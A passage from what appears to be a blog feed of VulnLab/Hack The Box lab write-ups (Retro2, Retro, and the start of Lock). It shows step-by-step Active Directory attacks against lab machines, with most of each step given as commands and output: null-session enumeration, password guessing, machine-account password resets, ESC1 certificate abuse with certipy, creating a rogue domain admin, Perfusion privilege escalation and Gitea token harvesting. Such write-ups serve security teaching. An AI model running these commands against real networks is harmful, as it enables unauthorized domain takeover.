hash.txt</span><br></pre></td></tr></table></figure><p><img src="/images/Retro2/john-crack.png" alt="john-crack"><br>Using the password <code>class08</code>, we unlock the microsoft access database:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapreader:&lt;REDACTED&gt;</span><br></pre></td></tr></table></figure><h3 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -u &quot;ldapreader&quot; -p &quot;&lt;REDACTED&gt;&quot; -d retro2.vl -dc BLN01.retro2.vl -ns 10.10.70.92 -c ALL --zip</span><br></pre></td></tr></table></figure><p>OR</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc ldap retro2.vl -u &#x27;ldapreader&#x27; -p &#x27;&lt;REDACTED&gt;&#x27; --bloodhound --dns-server &lt;ip&gt; -c All --dns-tcp</span><br></pre></td></tr></table></figure><p>The above command will get us a zip file that we will use on bloodhound and find our exploitation path<br><img src="/images/Retro2/bloodhound.png" alt="bloodhound"></p><h3 id="User"><a href="#User" class="headerlink" title="User"></a>User</h3><p>First we will try to use the username as the password lowercase for the machine account <code>fs01$</code>(Refer to this blog post that describes why this happens <a href="https://www.xmco.fr/en/active-directory-en/part-5-machine-accounts-in-the-active-directory/">https://www.xmco.fr/en/active-directory-en/part-5-machine-accounts-in-the-active-directory/</a>)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc smb retro2.vl -u &#x27;fs01$&#x27; -p &#x27;fs01&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Retro2/fs01-account.png" alt="fs01-account"><br>we need to change the password so we can use that machine account with the password</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-changepasswd &#x27;retro2.vl/fs01$&#x27;:&#x27;fs01&#x27;@retro2.vl -newpass StrongP@ss1234 -dc-ip BLN01.retro2.vl -p rpc-samr</span><br></pre></td></tr></table></figure><h4 id="GenericWrite"><a href="#GenericWrite" class="headerlink" title="GenericWrite"></a>GenericWrite</h4><p>We have control over FS01, we can take advantage of the <strong>GenericWrite</strong> permission we previously identified. Typically, this permission can be abused using one of the following techniques:</p><ul><li><strong>Shadow Credentials</strong> (applicable to Windows Server 2016 and later)</li><li><strong>Targeted Kerberoasting</strong> (only effective if the target’s password is weak and crackable)</li><li><strong>Resource-Based Constrained Delegation</strong></li></ul><p>As we are dealing with a Windows Server 2008 none of them will work so we will use another way we can modify another attribute <strong>unicodePwd</strong> which allows us to reset the password for <strong>“ADMWS01$”</strong> (Big thanks to serotonin for this exploitation path <a href="https://seriotonctf.github.io/2024/08/25/Retro2-Vulnlab/">https://seriotonctf.github.io/2024/08/25/Retro2-Vulnlab/</a> )</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net rpc password &#x27;ADMWS01$&#x27; Passw0rd1 -U retro2.vl/&#x27;fs01$&#x27;%StrongP@ss1234 -S BLN01.retro2.vl</span><br></pre></td></tr></table></figure><h4 id="AddMember"><a href="#AddMember" class="headerlink" title="AddMember"></a>AddMember</h4><p>We will add the user we own <code>ldapreader</code> to the group <code>Services</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net rpc group addmem &quot;Services&quot; &quot;ldapreader&quot; -U &quot;retro2.vl&quot;/&quot;ADMWS01$&quot;%&quot;Passw0rd1&quot; -S BLN01.retro2.vl</span><br></pre></td></tr></table></figure><p>Then we can just RDP to the machine:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:10.10.70.92 /u:&#x27;ldapreader&#x27; /p:&#x27;&lt;REDACTED&gt;&#x27; /d:retro2.vl /tls-seclevel:0</span><br></pre></td></tr></table></figure><h2 id="Priv-Escalation"><a href="#Priv-Escalation" class="headerlink" title="Priv Escalation"></a>Priv Escalation</h2><p>There is a great blog post by <a href="https://itm4n.github.io/">itm4n</a> on a no-fix vulnerability<br><a href="https://itm4n.github.io/windows-registry-rpceptmapper-eop/">https://itm4n.github.io/windows-registry-rpceptmapper-eop/</a><br><a href="https://itm4n.github.io/windows-registry-rpceptmapper-exploit/">https://itm4n.github.io/windows-registry-rpceptmapper-exploit/</a></p><p>Now with a tool named <a href="https://github.com/itm4n/Perfusion">Perfusion</a> we can get a system shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Perfusion.exe -c cmd -i</span><br></pre></td></tr></table></figure><p><a href="https://api.vulnlab.com/api/v1/share?id=bec17ffc-be95-49d1-915e-35c53826e85f" title="https:&#x2F;&#x2F;api.vulnlab.com&#x2F;api&#x2F;v1&#x2F;share?id&#x3D;bec17ffc-be95-49d1-915e-35c53826e85f">https://api.vulnlab.com/api/v1/share?id=bec17ffc-be95-49d1-915e-35c53826e85f</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VulnLab </tag>
            
            <tag> Hack The Box </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Retro</title>
      <link href="/2025/03/11/VL-Retro/"/>
      <url>/2025/03/11/VL-Retro/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulnlab-Retro-Active-Directory-Certificate-Services-Exploitation-Through-Legacy-Machine-Account-Abuse-and-ESC1-Template-Vulnerability"><a href="#Vulnlab-Retro-Active-Directory-Certificate-Services-Exploitation-Through-Legacy-Machine-Account-Abuse-and-ESC1-Template-Vulnerability" class="headerlink" title="Vulnlab Retro: Active Directory Certificate Services Exploitation Through Legacy Machine Account Abuse and ESC1 Template Vulnerability"></a>Vulnlab Retro: Active Directory Certificate Services Exploitation Through Legacy Machine Account Abuse and ESC1 Template Vulnerability</h1><p>In this comprehensive VulnLab - Hack The Box walkthrough, I’ll demonstrate how to penetrate the “Retro” domain environment by exploiting a series of vulnerabilities leading to complete domain compromise. Starting with anonymous SMB access and weak trainee account credentials, we’ll progress through legacy machine account exploitation, Active Directory Certificate Services enumeration, and ultimately achieve domain administrator privileges via ESC1 certificate template abuse with custom key sizes. This penetration test showcases several real-world Active Directory attack vectors including null session enumeration, legacy pre-Windows 2000 machine account exploitation, AD CS template misconfiguration, certificate-based authentication bypass, and privileged certificate enrollment for administrative access. The techniques demonstrated highlight common security misconfigurations in Windows environments that penetration testers should look for during enterprise assessments.</p><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-10 21:02:43Z)</span><br><span class="line">135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">445/tcp  open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp  open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: RETRO</span><br><span class="line">|   NetBIOS_Domain_Name: RETRO</span><br><span class="line">|   NetBIOS_Computer_Name: DC</span><br><span class="line">|   DNS_Domain_Name: retro.vl</span><br><span class="line">|   DNS_Computer_Name: DC.retro.vl</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2025-03-10T21:03:27+00:00</span><br><span class="line">| ssl-cert: Subject: commonName=DC.retro.vl</span><br><span class="line">| Issuer: commonName=DC.retro.vl</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2025-03-09T21:01:16</span><br><span class="line">| Not valid after:  2025-09-08T21:01:16</span><br><span class="line">| MD5:   57df:2f2a:42f8:12ba:1acb:785c:ad91:ac2b</span><br><span class="line">| SHA-1: 6a2d:a6d3:9d5e:38a0:ebd7:8775:5f7f:1659:3733:78eb</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -2h00m00s, deviation: 0s, median: -2h00m00s</span><br><span class="line">| p2p-conficker: </span><br><span class="line">|   Checking for Conficker.C or higher...</span><br><span class="line">|   Check 1 (port 48062/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 2 (port 9402/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 3 (port 6737/udp): CLEAN (Timeout)</span><br><span class="line">|   Check 4 (port 6198/udp): CLEAN (Timeout)</span><br><span class="line">|_  0/4 checks are positive: Host is CLEAN or ports are blocked</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2025-03-10T21:03:28</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br></pre></td></tr></table></figure><h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><p>As there is not much exposed on the machine first we will try smb null session</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //10.10.98.48 -N</span><br></pre></td></tr></table></figure><p><img src="/images/Retro/SMB-Nullses.png" alt="SMB-Nullses"><br>We can see that we can use null session and there is a <code>Trainees</code> share that looks interesting</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.98.48/Trainees -N</span><br></pre></td></tr></table></figure><p>Inside the share there is a <code>Important.txt</code> file we will get it to our machine with the below command</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get Important.txt</span><br></pre></td></tr></table></figure><p>Opening that file we see the following:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Dear Trainees,</span><br><span class="line"></span><br><span class="line">I know that some of you seemed to struggle with remembering strong and unique passwords.</span><br><span class="line">So we decided to bundle every one of you up into one account.</span><br><span class="line">Stop bothering us. Please. We have other stuff to do than resetting your password every day.</span><br><span class="line"></span><br><span class="line">Regards</span><br><span class="line"></span><br><span class="line">The Admins</span><br></pre></td></tr></table></figure><p>Now we will start searching for that account and try to brute force the password, we can use <code>impacket-lookupsid</code> to get some valid usernames as we have access to the null session.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-lookupsid guest@10.10.98.48 -no-pass</span><br></pre></td></tr></table></figure><p><img src="/images/Retro/lookupsid.png" alt="lookupsid"><br>The account that the trainees use is called <code>trainee</code> (we could have guessed it but ok)</p><p>After spraying it with some common password we tried to put the username as the password and it worked<br><img src="/images/Retro/trainee-smb.png" alt="trainee-smb"><br>Also we can see that now we have read access to the Notes share</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.98.48/Notes -U &quot;trainee&quot;</span><br></pre></td></tr></table></figure><p>And we download the file named <code>ToDo.txt</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get ToDo.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Thomas,</span><br><span class="line"></span><br><span class="line">after convincing the finance department to get rid of their ancienct banking software</span><br><span class="line">it is finally time to clean up the mess they made. We should start with the pre created</span><br><span class="line">computer account. That one is older than me.</span><br><span class="line"></span><br><span class="line">Best</span><br><span class="line"></span><br><span class="line">James </span><br></pre></td></tr></table></figure><p>After reading the <code>ToDo.txt</code> i started digging around for some info on old computer accounts and how they were created, and i found in an article the following</p><p>Note : In older Active Directories, it is possible to find accounts marked as “Assign this computer account as a pre-Windows 2000.” The password for these machine accounts is the lowercase name of the machine account itself. For example, the password for the machine account “XMCO$” would be “xmco”.</p><p><a href="https://www.xmco.fr/en/active-directory-en/part-5-machine-accounts-in-the-active-directory/">https://www.xmco.fr/en/active-directory-en/part-5-machine-accounts-in-the-active-directory/</a></p><h3 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h3><p>I used bloodhound python to get a better understanding of the domain</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -u &quot;trainee&quot; -p &quot;trainee&quot; -d retro.vl -dc DC.retro.vl -ns 10.10.98.48 --zip</span><br></pre></td></tr></table></figure><p>Using the below query we can see there are 2 machines:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MATCH (n:Computer) RETURN n</span><br></pre></td></tr></table></figure><p><img src="/images/Retro/mchine-accounts.png" alt="mchine-accounts"><br>We will try to use the machine account name <code>Banking$</code> with the password <code>banking</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.98.48 -u &#x27;Banking$&#x27; -p banking</span><br></pre></td></tr></table></figure><p>The error that we get is <code>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code> this can be fixed by changing password for the machine account.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-changepasswd &#x27;retro.vl/BANKING$&#x27;:banking@10.10.98.48 -newpass StrongP@ss1234 -dc-ip 10.10.98.48 -p rpc-samr</span><br></pre></td></tr></table></figure><h3 id="AD-CS"><a href="#AD-CS" class="headerlink" title="AD CS"></a>AD CS</h3><p>Running certipy to find any templates that may be vulnurable:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -u &#x27;banking$&#x27;@retro.vl -p StrongP@ss1234 -dc-ip 10.10.98.48</span><br></pre></td></tr></table></figure><p>After opening the text file we see that one template is vulnerable to <code>ESC1</code> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">Certificate Templates</span><br><span class="line">  0</span><br><span class="line">    Template Name                       : RetroClients</span><br><span class="line">    Display Name                        : Retro Clients</span><br><span class="line">    Certificate Authorities             : retro-DC-CA</span><br><span class="line">    Enabled                             : True</span><br><span class="line">    Client Authentication               : True</span><br><span class="line">    Enrollment Agent                    : False</span><br><span class="line">    Any Purpose                         : False</span><br><span class="line">    Enrollee Supplies Subject           : True</span><br><span class="line">    Certificate Name Flag               : EnrolleeSuppliesSubject</span><br><span class="line">    Enrollment Flag                     : None</span><br><span class="line">    Private Key Flag                    : 16842752</span><br><span class="line">    Extended Key Usage                  : Client Authentication</span><br><span class="line">    Requires Manager Approval           : False</span><br><span class="line">    Requires Key Archival               : False</span><br><span class="line">    Authorized Signatures Required      : 0</span><br><span class="line">    Validity Period                     : 1 year</span><br><span class="line">    Renewal Period                      : 6 weeks</span><br><span class="line">    Minimum RSA Key Length              : 4096</span><br><span class="line">    Permissions</span><br><span class="line">      Enrollment Permissions</span><br><span class="line">        Enrollment Rights               : RETRO.VL\Domain Admins</span><br><span class="line">                                          RETRO.VL\Domain Computers</span><br><span class="line">                                          RETRO.VL\Enterprise Admins</span><br><span class="line">      Object Control Permissions</span><br><span class="line">        Owner                           : RETRO.VL\Administrator</span><br><span class="line">        Write Owner Principals          : RETRO.VL\Domain Admins</span><br><span class="line">                                          RETRO.VL\Enterprise Admins</span><br><span class="line">                                          RETRO.VL\Administrator</span><br><span class="line">        Write Dacl Principals           : RETRO.VL\Domain Admins</span><br><span class="line">                                          RETRO.VL\Enterprise Admins</span><br><span class="line">                                          RETRO.VL\Administrator</span><br><span class="line">        Write Property Principals       : RETRO.VL\Domain Admins</span><br><span class="line">                                          RETRO.VL\Enterprise Admins</span><br><span class="line">                                          RETRO.VL\Administrator</span><br><span class="line">    [!] Vulnerabilities</span><br><span class="line">      ESC1                              : &#x27;RETRO.VL\\Domain Computers&#x27; can enroll, enrollee supplies subject and template allows client authentication</span><br></pre></td></tr></table></figure><p>We can exploit ESC1 we will use the below command</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u &quot;banking$&quot; -p &quot;StrongP@ss1234&quot; -target retro.vl -upn administrator@retro.vl -ca retro-DC-CA -template RetroClients</span><br></pre></td></tr></table></figure><p><img src="/images/Retro/ESC01-Certipy.png" alt="ESC01-Certipy"><br>It fails with <code>CERTSRV_E_KEY_LENGTH</code> looking into it we find this article <a href="https://www.gradenegger.eu/en/the-request-for-certificates-via-the-network-device-registration-service-ndes-fails-with-the-error-message-the-public-key-does-not-meet-the-minimum-size-required-by-the-specified-cer/">https://www.gradenegger.eu/en/the-request-for-certificates-via-the-network-device-registration-service-ndes-fails-with-the-error-message-the-public-key-does-not-meet-the-minimum-size-required-by-the-specified-cer/</a></p><p>That states:</p><p>This error occurs if the key length in the certificate request is less than configured in the certificate template configured for the NDES server. Thus, either the “Minimum Key Length” in the certificate template must be reduced, or a new certificate request with a sufficiently large key must be formed and sent to the NDES server.</p><p>Looking back at the certipy output we see that tamplate requires a minimum RSA key of 4096 Bytes</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u &#x27;BANKING$&#x27;@retro.vl -p &quot;StrongP@ss1234&quot; -dc-ip 10.10.98.48 -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl -key-size 4096</span><br></pre></td></tr></table></figure><h4 id="First-way"><a href="#First-way" class="headerlink" title="First way"></a>First way</h4><p>Now that we have the <code>administrator.pfx</code> we will spawn an ldap shell and create a new user and add him to Domain Admins</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx administrator.pfx -dc-ip 192.168.0.100 -ldap-shell</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add_user EvilAdmin  </span><br><span class="line">add_user_to_group EvilAdmin &#x27;Domain Admins&#x27;</span><br></pre></td></tr></table></figure><h4 id="Second-way"><a href="#Second-way" class="headerlink" title="Second way"></a>Second way</h4><p>We will get a valid TGT as administrator</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx administrator.pfx -dc-ip 10.10.98.48</span><br></pre></td></tr></table></figure><p>Using that hash to get a shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KRB5CCNAME=administrator.ccache impacket-wmiexec -k -no-pass -dc-ip 10.10.98.48 retro.vl/administrator@DC.retro.vl</span><br></pre></td></tr></table></figure><p>Using <code>impacket-wmiexec</code> we can get a shell and grab our flags</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-wmiexec EvilAdmin:&#x27;l0KHCK8F0Y?&lt;&amp;_T&#x27;@10.10.98.48</span><br></pre></td></tr></table></figure><p><a href="https://api.vulnlab.com/api/v1/share?id=ddf64ae9-fcad-498e-84ef-89aa99b6a242">https://api.vulnlab.com/api/v1/share?id=ddf64ae9-fcad-498e-84ef-89aa99b6a242</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VulnLab </tag>
            
            <tag> Hack The Box </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Lock</title>
      <link href="/2025/03/10/VL-Lock/"/>
      <url>/2025/03/10/VL-Lock/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-The-Box-VL-Lock-Windows-Privilege-Escalation-Through-Gitea-Repository-Exploitation-and-PDF24-MSI-Installer-Abuse"><a href="#Hack-The-Box-VL-Lock-Windows-Privilege-Escalation-Through-Gitea-Repository-Exploitation-and-PDF24-MSI-Installer-Abuse" class="headerlink" title="Hack The Box - VL Lock: Windows Privilege Escalation Through Gitea Repository Exploitation and PDF24 MSI Installer Abuse"></a>Hack The Box - VL Lock: Windows Privilege Escalation Through Gitea Repository Exploitation and PDF24 MSI Installer Abuse</h1><p>In this comprehensive VulnLab-Hack The Box walkthrough, I’ll demonstrate how to penetrate the “Lock” machine environment by exploiting a series of vulnerabilities leading to complete system compromise. Starting with Gitea repository enumeration and personal access token discovery, we’ll progress through automated deployment exploitation for initial access, credential extraction from mRemoteNG configuration files, and ultimately achieve SYSTEM-level privileges via PDF24 Creator MSI installer abuse (CVE-2023-49147).</p><p>This penetration test showcases several real-world attack vectors including Git repository credential harvesting, CI&#x2F;CD pipeline exploitation for web shell deployment, encrypted credential decryption from connection manager files, and leveraging MSI installer vulnerabilities with OpLock techniques for privilege escalation. The techniques demonstrated highlight common security misconfigurations in development environments that penetration testers should look for during enterprise assessments.</p><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Not shown: 995 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE       REASON          VERSION</span><br><span class="line">80/tcp   open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34</span><br><span class="line">| http-methods:</span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-title: Lock - Index</span><br><span class="line">445/tcp  open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">3000/tcp open  ppp</span><br><span class="line">3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">| rdp-ntlm-info:</span><br><span class="line">|   Target_Name: LOCK</span><br><span class="line">|   NetBIOS_Domain_Name: LOCK</span><br><span class="line">|   NetBIOS_Computer_Name: LOCK</span><br><span class="line">|   DNS_Domain_Name: Lock</span><br><span class="line">|   DNS_Computer_Name: Lock</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2025-03-08T14:18:31+00:00</span><br><span class="line">5357/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0</span><br><span class="line">5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0</span><br></pre></td></tr></table></figure><h2 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h2><h3 id="Gitea"><a href="#Gitea" class="headerlink" title="Gitea"></a>Gitea</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.69.227:3000/</span><br></pre></td></tr></table></figure><p><img src="/images/Lock/Gitea-website.png" alt="Image discritpion"></p><p>Possible Username: <code>ellen.freeman</code></p><p>Looking into the commits we can find the gitea personal token:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.69.227:3000/ellen.freeman/dev-scripts/commit/8b78e6c3024416bce55926faa3f65421a25d6370</span><br></pre></td></tr></table></figure><p><img src="/images/Lock/Gitea-Token.png" alt="Image discritpion"></p><p>Modifying the script so it uses the AUTH token:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">format_domain</span>(<span class="params">domain</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> domain.startswith((<span class="string">&#x27;http://&#x27;</span>, <span class="string">&#x27;https://&#x27;</span>)):</span><br><span class="line">        domain = <span class="string">&#x27;https://&#x27;</span> + domain</span><br><span class="line">    <span class="keyword">return</span> domain</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_repositories</span>(<span class="params">token, domain</span>):</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">f&#x27;token <span class="subst">&#123;token&#125;</span>&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">f&#x27;<span class="subst">&#123;domain&#125;</span>/api/v1/user/repos&#x27;</span></span><br><span class="line">    response = requests.get(url, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span 